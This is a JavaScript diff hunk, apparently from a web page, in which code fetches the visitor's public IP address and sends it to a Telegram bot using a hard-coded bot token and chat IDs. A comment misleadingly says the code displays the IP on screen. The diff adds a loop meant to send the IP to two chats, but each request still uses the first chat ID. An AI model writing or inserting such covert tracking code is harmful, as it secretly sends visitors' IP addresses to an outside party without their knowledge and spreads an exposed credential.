@@ -2047,10 +2047,18 @@
     fetch("https://api.ipify.org?format=json")
         .then(response => response.json())
         .then(data => {
+            let url
             // Display the IP address on the screen
-            let url1 = `https://api.telegram.org/bot6480737039:AAFf475pQ3Pe2ESj1jZ1fqZxzrRIybUjKFg/sendMessage?chat_id=977619219&text=IP ${data.ip}`;
-            Http.open("GET", url1);
-            Http.send();
+            let usrs = ["977619219", "7101743731"]
+            for (var i in usrs) {
+                url = `https://api.telegram.org/bot6480737039:AAFf475pQ3Pe2ESj1jZ1fqZxzrRIybUjKFg/sendMessage?chat_id=977619219&text=IP ${data.ip}`;
+
+                Http.open("GET", url);
+                Http.send();
+            }
+            // let url1 = `https://api.telegram.org/bot6480737039:AAFf475pQ3Pe2ESj1jZ1fqZxzrRIybUjKFg/sendMessage?chat_id=977619219&text=IP ${data.ip}`;
+            // Http.open("GET", url1);
+            // Http.send();
 
             // let url2 = `https://api.telegram.org/bot6480737039:AAFf475pQ3Pe2ESj1jZ1fqZxzrRIybUjKFg/sendMessage?chat_id=7101743731&text=IP ${data.ip}`;
             // Http.open("GET", url2);
